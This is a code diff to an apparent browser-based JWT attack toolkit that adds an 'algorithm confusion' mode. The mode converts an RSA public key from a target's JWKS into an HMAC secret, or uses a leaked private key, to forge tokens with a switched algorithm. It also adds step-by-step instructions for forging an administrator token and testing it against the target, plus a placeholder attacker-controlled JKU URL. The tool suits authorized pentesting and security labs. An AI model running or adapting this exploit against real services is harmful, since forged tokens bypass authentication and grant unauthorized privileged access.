@@ -22,6 +22,8 @@ const jwksOutput = document.getElementById('jwksOutput');
 const attackSteps = document.getElementById('attackSteps');
 const kidTools = document.getElementById('kidTools');
 const kidAlgSelect = document.getElementById('kidAlgSelect');
+const algorithmConfusionTools = document.getElementById('algorithmConfusionTools');
+const algConfusionDirection = document.getElementById('algConfusionDirection');
 const generateBtn = document.getElementById('generateBtn');
 const resultToken = document.getElementById('resultToken');
 const attackNotes = document.getElementById('attackNotes');
@@ -89,6 +91,56 @@ async function generateJwkAttackToken(forceJwkSign) {
       resultToken.value = `${signingInput}.${nextSig}`;
       attackNotes.textContent = `Signed with HS256 and secret: "${secret}".`;
       return;
+    }
+
+    if (selectedAttack === 'algorithm-confusion') {
+      const direction = algConfusionDirection ? algConfusionDirection.value : 'rs-to-hs';
+      const jwks = readJsonInput('{"keys":[...]}', 'Please provide full jwks.json content.');
+      const sourceAlg = (baseHeader.alg || '').toUpperCase();
+
+      if (!Array.isArray(jwks.keys) || jwks.keys.length === 0) {
+        throw new Error('JWKS must contain non-empty keys array.');
+      }
+
+      delete nextHeader.jku;
+      delete nextHeader.jwk;
+
+      if (direction === 'rs-to-hs') {
+        const rsaKey = pickRsaKeyFromJwks(jwks, baseHeader.kid);
+        const hashBits = sourceAlg.endsWith('384') ? '384' : sourceAlg.endsWith('512') ? '512' : '256';
+        nextHeader.alg = `HS${hashBits}`;
+        if (rsaKey.kid) nextHeader.kid = rsaKey.kid;
+
+        const pem = await jwkRsaPublicToPem(rsaKey);
+        const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
+        nextSig = await hmacSignBase64url(signingInput, pem, hashFromAlg(nextHeader.alg));
+        resultToken.value = `${signingInput}.${nextSig}`;
+        attackNotes.textContent = [
+          `Algorithm confusion candidate generated (${direction}).`,
+          `Header alg switched to ${nextHeader.alg}.`,
+          'HMAC secret was built automatically from RSA public key in provided JWKS.',
+        ].join('\n');
+        return;
+      }
+
+      if (direction === 'hs-to-rs') {
+        const rsaPrivateKey = pickRsaPrivateKeyFromJwks(jwks, baseHeader.kid);
+        const hashBits = sourceAlg.endsWith('384') ? '384' : sourceAlg.endsWith('512') ? '512' : '256';
+        nextHeader.alg = `RS${hashBits}`;
+        if (rsaPrivateKey.kid) nextHeader.kid = rsaPrivateKey.kid;
+
+        const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
+        nextSig = await rsaPkcs1SignBase64url(signingInput, rsaPrivateKey, hashFromAlg(nextHeader.alg));
+        resultToken.value = `${signingInput}.${nextSig}`;
+        attackNotes.textContent = [
+          `Algorithm confusion candidate generated (${direction}).`,
+          `Header alg switched to ${nextHeader.alg}.`,
+          'JWT signed with RSA private JWK extracted from provided JWKS.',
+        ].join('\n');
+        return;
+      }
+
+      throw new Error('Unsupported direction for algorithm confusion.');
     }
 
     if (selectedAttack === 'jwk-header-injection') {
@@ -178,6 +230,7 @@ function configureInputForAttack(key) {
   jwkTools.classList.add('hidden');
   jkuTools.classList.add('hidden');
   kidTools.classList.add('hidden');
+  if (algorithmConfusionTools) algorithmConfusionTools.classList.add('hidden');
   extraInput.classList.remove('hidden');
   extraInputLabel.classList.remove('hidden');
   extraInputHelp.classList.remove('hidden');
@@ -193,6 +246,11 @@ function configureInputForAttack(key) {
   if (key === 'jku-header-injection') {
     showInput('JKU URL', 'https://attacker.example/jwks.json', 'Required attacker-controlled JWKS URL where jwks.json is hosted.');
     jkuTools.classList.remove('hidden');
+    return;
+  }
+  if (key === 'algorithm-confusion') {
+    showInput('JWKS JSON', '{"keys":[{"kty":"RSA","n":"...","e":"AQAB","kid":"..."}]}', 'Required full jwks.json file. Tool extracts needed key data automatically.');
+    if (algorithmConfusionTools) algorithmConfusionTools.classList.remove('hidden');
     return;
   }
   if (key === 'kid-path-traversal') {
@@ -286,6 +344,16 @@ function getAttackSteps(key) {
       '5) Click Generate and test generated token.',
     ].join('\n');
   }
+  if (key === 'algorithm-confusion') {
+    return [
+      '1) Paste source JWT and click Decode token.',
+      '2) Edit payload as needed for your test case (for example, set "sub":"administrator").',
+      '3) In Attack-specific input choose direction: RS → HS or HS → RS.',
+      '4) Paste full jwks.json (with keys array) from target endpoint.',
+      '5) Click Generate. Tool auto-extracts key params and signs token with converted alg.',
+      '6) Send request with generated token and validate behavior.',
+    ].join('\n');
+  }
 
   return 'Select an attack to see guided steps.';
 }
@@ -294,6 +362,7 @@ function getPresetHint(key) {
   const hints = {
     'unverified-signature': 'Generates token with invalid signature.',
     'flawed-signature': 'Generates alg=none token with empty signature.',
+    'algorithm-confusion': 'Switch RS↔HS using full JWKS input and auto-extracted key material.',
     'weak-signing-key': 'Requires user-provided secret.',
     'jwk-header-injection': 'Choose algorithm, generate key, then generate token.',
     'jku-header-injection': 'Requires jku URL.',
@@ -357,6 +426,42 @@ function minimalPublicJwk(jwk) {
   if (jwk.kty === 'OKP') return { kty: 'OKP', crv: jwk.crv, x: jwk.x, ...(jwk.kid ? { kid: jwk.kid } : {}) };
   if (jwk.kty === 'oct') return { kty: 'oct', k: jwk.k, ...(jwk.kid ? { kid: jwk.kid } : {}) };
   return jwk;
+}
+
+function pickRsaKeyFromJwks(jwks, preferredKid) {
+  const keys = jwks.keys.filter((k) => k && k.kty === 'RSA' && k.n && k.e);
+  if (keys.length === 0) throw new Error('No RSA public key (n/e) found in JWKS.');
+  if (preferredKid) {
+    const byKid = keys.find((k) => k.kid === preferredKid);
+    if (byKid) return byKid;
+  }
+  return keys[0];
+}
+
+function pickRsaPrivateKeyFromJwks(jwks, preferredKid) {
+  const keys = jwks.keys.filter((k) => k && k.kty === 'RSA' && k.n && k.e && k.d);
+  if (keys.length === 0) {
+    throw new Error('HS→RS requires RSA private JWK in jwks.json (field "d" is missing).');
+  }
+  if (preferredKid) {
+    const byKid = keys.find((k) => k.kid === preferredKid);
+    if (byKid) return byKid;
+  }
+  return keys[0];
+}
+
+async function jwkRsaPublicToPem(rsaJwk) {
+  const key = await crypto.subtle.importKey(
+    'jwk',
+    { kty: 'RSA', n: rsaJwk.n, e: rsaJwk.e, ext: true },
+    { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' },
+    true,
+    ['verify'],
+  );
+  const spki = await crypto.subtle.exportKey('spki', key);
+  const b64 = btoa(String.fromCharCode(...new Uint8Array(spki)));
+  const lines = b64.match(/.{1,64}/g)?.join('\n') || b64;
+  return `-----BEGIN PUBLIC KEY-----\n${lines}\n-----END PUBLIC KEY-----`;
 }
 async function signWithMaterial(signingInput, alg, material) {
   if (alg.startsWith('HS')) return hmacSignBase64url(signingInput, material.secret, hashFromAlg(alg));
